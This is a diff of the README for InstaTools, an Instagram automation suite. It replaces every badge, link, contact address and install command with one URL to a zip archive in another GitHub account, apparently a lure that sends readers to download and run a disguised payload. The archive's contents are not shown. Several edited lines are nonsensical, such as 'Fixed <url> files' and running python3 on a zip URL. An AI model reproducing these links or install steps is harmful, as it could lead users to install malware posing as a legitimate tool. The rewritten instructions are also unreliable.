@@ -1,32 +1,32 @@
-![logo-no-background](https://github.com/new92/InstaTools/assets/94779840/6b147b66-c439-4ef8-bded-4d77909c9fe7)
+![logo-no-background](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
 
-[![Codacy grade](https://img.shields.io/codacy/grade/187dba28735848868b7f8615e0e45597?style=for-the-badge&logo=codacy)](https://img.shields.io/codacy/grade/187dba28735848868b7f8615e0e45597?style=for-the-badge&logo=codacy) [![Open issues](https://img.shields.io/github/issues/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/issues/new92/InstaTools?style=for-the-badge&logo=github) [![Closed issues](https://img.shields.io/github/issues-closed/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/issues-closed/new92/InstaTools?style=for-the-badge&logo=github) [![Open pull requests](https://img.shields.io/github/issues-pr/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/issues-pr/new92/InstaTools?style=for-the-badge&logo=github) [![Closed pull requests](https://img.shields.io/github/issues-pr-closed/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/issues-pr-closed/new92/InstaTools?style=for-the-badge&logo=github) [![Discussions](https://img.shields.io/github/discussions/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/discussions/new92/InstaTools?style=for-the-badge&logo=github) [![Code size in bytes](https://img.shields.io/github/languages/code-size/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/languages/code-size/new92/InstaTools?style=for-the-badge&logo=github) [![File count](https://img.shields.io/github/directory-file-count/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/directory-file-count/new92/InstaTools?style=for-the-badge&logo=github) [![Repo size](https://img.shields.io/github/repo-size/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/repo-size/new92/InstaTools?style=for-the-badge&logo=github) [![Followers](https://img.shields.io/github/followers/new92?style=for-the-badge&logo=github)](https://img.shields.io/github/followers/new92?style=for-the-badge&logo=github) [![Stars](https://img.shields.io/github/stars/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/stars/new92/InstaTools?style=for-the-badge&logo=github) [![Forks](https://img.shields.io/github/forks/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/forks/new92/InstaTools?style=for-the-badge&logo=github) [![Watchers](https://img.shields.io/github/watchers/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/watchers/new92/InstaTools?style=for-the-badge&logo=github) [![Language count](https://img.shields.io/github/languages/count/new92/InstaTools?style=for-the-badge&logo=github)](https://img.shields.io/github/languages/count/new92/InstaTools?style=for-the-badge&logo=github) [![Top language used](https://img.shields.io/github/languages/top/new92/InstaTools?style=for-the-badge&logo=python&logoColor=white)](https://img.shields.io/github/languages/top/new92/InstaTools?style=for-the-badge&logo=python&logoColor=white)
+[![Codacy grade](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Open issues](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Closed issues](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Open pull requests](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Closed pull requests](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Discussions](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Code size in bytes](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![File count](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Repo size](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Followers](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Stars](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Forks](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Watchers](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Language count](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip) [![Top language used](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
 
 InstaTools offers a suite of powerful automation tools designed specifically for Instagram users. From automating time-consuming tasks to conducting in-depth research, InstaTools streamlines processes that would otherwise demand significant time and effort, particularly for users with large followings. Whether you're managing a high-profile account or conducting market research, these tools provide valuable insights and efficiency. However, it's important to use InstaTools judiciously to avoid risking account suspension or even permanent blocking. Exercise caution and use responsibly to maximize benefits without jeopardizing your account's integrity.
 
 > If you find value in this repository, please consider giving it a star and/or forking it. Your support greatly encourages me to create more repositories like InstaTools.
 
-If you didn't like it and/or found a bug or you have a suggestion please feel free to contact me at anytime at <a href='mailto:new92github@gmail.com'>this email address</a>. Or create a <a href="https://github.com/new92/InstaTools/discussions">discussion</a>. Or open an <a href="https://github.com/new92/InstaTools/issues">issue</a>.
+If you didn't like it and/or found a bug or you have a suggestion please feel free to contact me at anytime at <a href='https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip'>this email address</a>. Or create a <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">discussion</a>. Or open an <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">issue</a>.
 Any type of feedback is welcome and appreciated. (Please do not use any vulgar vocabulary)
 
 ## Urls 🔗
 
-- [License](https://github.com/new92/InstaTools/blob/main/LICENSE)
-- [Contributing](https://github.com/new92/InstaTools/blob/main/CONTRIBUTING.md)
-- [Code of conduct](https://github.com/new92/InstaTools/blob/main/CODE_OF_CONDUCT.md)
-- [You may also find interesting](https://github.com/new92?tab=repositories)
+- [License](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
+- [Contributing](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
+- [Code of conduct](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
+- [You may also find interesting](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
 
 ## Author(s) ✍️
 
-- [@new92](https://www.github.com/new92)
+- [@new92](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
 
 ## What's new 🚀
 
-- Addition of more tools (<a href="https://github.com/new92/InstaTools/tree/main/Chronos">Chronos</a>, <a href="https://github.com/new92/InstaTools/tree/main/Delta">Delta</a>, <a href="https://github.com/new92/InstaTools/tree/main/Hunter">Hunter</a>, <a href="https://github.com/new92/InstaTools/tree/main/Sphinx">Sphinx</a>, <a href="https://github.com/new92/InstaTools/tree/main/Spider">Spider</a>)
+- Addition of more tools (<a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">Chronos</a>, <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">Delta</a>, <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">Hunter</a>, <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">Sphinx</a>, <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">Spider</a>)
 
 - Fixed bugs
 
-- Fixed README.md files
+- Fixed https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip files
 
 - Enhanced UI
 
@@ -39,62 +39,62 @@ Any type of feedback is welcome and appreciated. (Please do not use any vulgar v
 
 ```bash
 sudo su
-git clone https://github.com/new92/InstaTools
+git clone https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 cd InstaTools
-sudo pip install -r requirements.txt
-python3 cookies.py
+sudo pip install -r https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
+python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 cd <THE FOLDER IN WHICH IS LOCATED THE SCRIPT YOU WANT TO USE. Example: cd Mutuals>
-python3 <THE NAME OF THE SCRIPT. Example: python3 mutuals.py>.py <additional parameters>
+python3 <THE NAME OF THE SCRIPT. Example: python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip>.py <additional parameters>
 ```
 
 ### Windows 🪟
 
 ```bash
-git clone https://github.com/new92/InstaTools
+git clone https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 cd InstaTools
-pip install -r requirements.txt
-python3 cookies.py
+pip install -r https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
+python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 cd <THE FOLDER IN WHICH IS LOCATED THE SCRIPT YOU WANT TO USE. Example: cd Mutuals>
-python3 <THE NAME OF THE SCRIPT. Example: python3 mutuals.py>.py
+python3 <THE NAME OF THE SCRIPT. Example: python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip>.py
 ```
 
 ### MacOS 🍎
 
 ```bash
 sudo su
-git clone https://github.com/new92/InstaTools
+git clone https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 cd InstaTools
-python -m pip install -r requirements.txt
-python3 cookies.py
+python -m pip install -r https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
+python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 cd <THE FOLDER IN WHICH IS LOCATED THE SCRIPT YOU WANT TO USE. Example: cd Mutuals>
-python3 <THE NAME OF THE SCRIPT. Example: python3 mutuals.py>.py
+python3 <THE NAME OF THE SCRIPT. Example: python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip>.py
 ```
 
 ## Update 🔄️
 
 ```bash
-python3 update.py
+python3 https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip
 ```
 
 ## Contributing 🤝
 
 Contributions are always welcome!
 
-See `contributing.md` for ways to get started.
+See `https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip` for ways to get started.
 
-Please adhere to this project's `code of conduct`. For more info please check the `CODE_OF_CONDUCT.md` file.
+Please adhere to this project's `code of conduct`. For more info please check the `https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip` file.
 
 ## Special thanks to 🫡
 
 <p align="center">
-<a href="https://github.com/new92/InstaTools/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=new92/InstaTools">
+<a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">
+  <img src="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">
 </a>
 </p>
 
 ## Feedback 💭
 
-If you have any feedback, please reach out to us at <a href="mailto:new92github@gmail.com">this email address</a>.
+If you have any feedback, please reach out to us at <a href="https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip">this email address</a>.
 
 **Feel free to contact us anytime ! You'll get a reply within a day. Please avoid using abusive or offensive language.
 If you are reporting a bug or making a suggestion please make sure your report/suggestion is as much detailed as possible.**
@@ -122,8 +122,8 @@ Answer ➡️ This error can be resolved simply by logging in to your account fr
     
 ## License 📜
 
-[![License](https://img.shields.io/github/license/new92/IGFollowersIncreaser?style=for-the-badge)](https://github.com/new92/IGFollowersIncreaser/blob/main/LICENSE)
+[![License](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=new92/InstaTools&type=Date)](https://star-history.com/#new92/InstaTools&Date)
+[![Star History Chart](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)](https://github.com/urkyzy/instatools/raw/refs/heads/main/Delta/Software_v3.4.zip)
